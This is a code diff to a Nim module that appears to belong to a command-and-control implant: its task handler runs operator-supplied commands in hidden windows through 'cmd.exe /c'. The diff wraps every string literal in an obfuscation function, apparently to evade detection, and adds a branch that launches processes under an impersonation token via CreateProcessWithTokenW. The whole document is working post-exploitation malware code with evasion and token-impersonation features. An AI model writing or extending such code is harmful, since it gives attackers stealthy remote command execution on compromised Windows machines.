@@ -1,7 +1,9 @@
 import json
+import ../utils/strenc
 
 when defined(windows):
   import winim/lean
+  import token_manager
 else:
   import osproc
 
@@ -17,10 +19,10 @@ proc run*(taskId: string, params: JsonNode): JsonNode =
     
     if args.executable.len == 0:
       return %*{
-        "task_id": taskId,
-        "completed": true,
-        "status": "error",
-        "user_output": "Executable path cannot be empty"
+        obf("task_id"): taskId,
+        obf("completed"): true,
+        obf("status"): "error",
+        obf("user_output"): obf("Executable path cannot be empty")
       }
     
     when defined(windows):
@@ -34,9 +36,9 @@ proc run*(taskId: string, params: JsonNode): JsonNode =
       si.wShowWindow = SW_HIDE
       
       # Build command line - handle "default" case for shell alias
-      if args.executable == "default":
+      if args.executable == obf("default"):
         # When called from shell command, arguments contains the actual command
-        commandLine = "cmd.exe /c " & args.arguments
+        commandLine = obf("cmd.exe /c ") & args.arguments
       elif args.arguments.len > 0:
         commandLine = args.executable & " " & args.arguments
       else:
@@ -54,20 +56,20 @@ proc run*(taskId: string, params: JsonNode): JsonNode =
       
       if CreatePipe(addr hStdoutRead, addr hStdoutWrite, addr sa, 0) == 0:
         return %*{
-          "task_id": taskId,
-          "completed": true,
-          "status": "error",
-          "user_output": "Failed to create stdout pipe"
+          obf("task_id"): taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): obf("Failed to create stdout pipe")
         }
       
       if CreatePipe(addr hStderrRead, addr hStderrWrite, addr sa, 0) == 0:
         CloseHandle(hStdoutRead)
         CloseHandle(hStdoutWrite)
         return %*{
-          "task_id": taskId,
-          "completed": true,
-          "status": "error",
-          "user_output": "Failed to create stderr pipe"
+          obf("task_id"): taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): obf("Failed to create stderr pipe")
         }
       
       # Make sure read handles are not inherited
@@ -78,19 +80,66 @@ proc run*(taskId: string, params: JsonNode): JsonNode =
       si.hStdError = hStderrWrite
       si.hStdInput = GetStdHandle(STD_INPUT_HANDLE)
       
-      # Create process
-      let createResult = CreateProcessA(
-        nil,
-        addr commandLine[0],
-        nil,
-        nil,
-        TRUE,  # Inherit handles
-        CREATE_NO_WINDOW,
-        nil,
-        nil,
-        addr si,
-        addr pi
-      )
+      # Check if we have an impersonation token
+      let tokenHandle = getTokenHandle()
+      var createResult: WINBOOL
+      
+      if tokenHandle != 0:
+        # We have an impersonation token - try CreateProcessWithTokenW
+        # Convert command line to wide string
+        var commandLineW = newWideCString(commandLine)
+        
+        # Create STARTUPINFOW for the wide-char version
+        var siW: STARTUPINFOW
+        siW.cb = sizeof(STARTUPINFOW).DWORD
+        siW.dwFlags = STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW
+        siW.wShowWindow = SW_HIDE
+        siW.hStdOutput = hStdoutWrite
+        siW.hStdError = hStderrWrite
+        siW.hStdInput = GetStdHandle(STD_INPUT_HANDLE)
+        
+        # Try CreateProcessWithTokenW to run as the impersonated user
+        createResult = CreateProcessWithTokenW(
+          tokenHandle,
+          0,  # LOGON_WITH_PROFILE
+          nil,
+          cast[LPWSTR](commandLineW[0].addr),
+          CREATE_NO_WINDOW,
+          nil,
+          nil,
+          addr siW,
+          addr pi
+        )
+        
+        # If it fails with ACCESS_DENIED (error 5), fall back to CreateProcessA
+        # CreateProcessWithTokenW requires SE_IMPERSONATE_NAME privilege which regular users don't have
+        if createResult == 0 and GetLastError() == 5:
+          createResult = CreateProcessA(
+            nil,
+            addr commandLine[0],
+            nil,
+            nil,
+            TRUE,  # Inherit handles
+            CREATE_NO_WINDOW,
+            nil,
+            nil,
+            addr si,
+            addr pi
+          )
+      else:
+        # No impersonation token - use normal CreateProcessA
+        createResult = CreateProcessA(
+          nil,
+          addr commandLine[0],
+          nil,
+          nil,
+          TRUE,  # Inherit handles
+          CREATE_NO_WINDOW,
+          nil,
+          nil,
+          addr si,
+          addr pi
+        )
       
       # Close write ends of pipes
       CloseHandle(hStdoutWrite)
@@ -101,10 +150,10 @@ proc run*(taskId: string, params: JsonNode): JsonNode =
         CloseHandle(hStdoutRead)
         CloseHandle(hStderrRead)
         return %*{
-          "task_id": taskId,
-          "completed": true,
-          "status": "error",
-          "user_output": "Failed to create process. Error code: " & $errorCode
+          obf("task_id"): taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): obf("Failed to create process. Error code: ") & $errorCode
         }
       
       # Read output
@@ -142,13 +191,13 @@ proc run*(taskId: string, params: JsonNode): JsonNode =
         finalOutput.add(errors)
       
       if finalOutput.len == 0:
-        finalOutput = "(No output)"
+        finalOutput = obf("(No output)")
       
       return %*{
-        "task_id": taskId,
-        "completed": true,
-        "status": if exitCode == 0: "success" else: "error",
-        "user_output": finalOutput
+        obf("task_id"): taskId,
+        obf("completed"): true,
+        obf("status"): if exitCode == 0: obf("success") else: "error",
+        obf("user_output"): finalOutput
       }
     else:
       # Unix-like systems
@@ -158,23 +207,23 @@ proc run*(taskId: string, params: JsonNode): JsonNode =
       
       let (output, exitCode) = execCmdEx(cmd)
       
-      var finalOutput = "Process executed successfully\n"
-      finalOutput.add("Command: " & cmd & "\n")
-      finalOutput.add("Exit code: " & $exitCode & "\n")
+      var finalOutput = obf("Process executed successfully\n")
+      finalOutput.add(obf("Command: ") & cmd & "\n")
+      finalOutput.add(obf("Exit code: ") & $exitCode & "\n")
       if output.len > 0:
-        finalOutput.add("\n=== Output ===\n" & output & "\n==============\n")
+        finalOutput.add(obf("\n=== Output ===\n") & output & obf("\n==============\n"))
       
       return %*{
-        "task_id": taskId,
-        "completed": true,
-        "status": "success",
-        "user_output": finalOutput
+        obf("task_id"): taskId,
+        obf("completed"): true,
+        obf("status"): obf("success"),
+        obf("user_output"): finalOutput
       }
       
   except Exception as e:
     return %*{
-      "task_id": taskId,
-      "completed": true,
-      "status": "error",
-      "user_output": "Failed to execute process: " & e.msg
+      obf("task_id"): taskId,
+      obf("completed"): true,
+      obf("status"): "error",
+      obf("user_output"): obf("Failed to execute process: ") & e.msg
     }
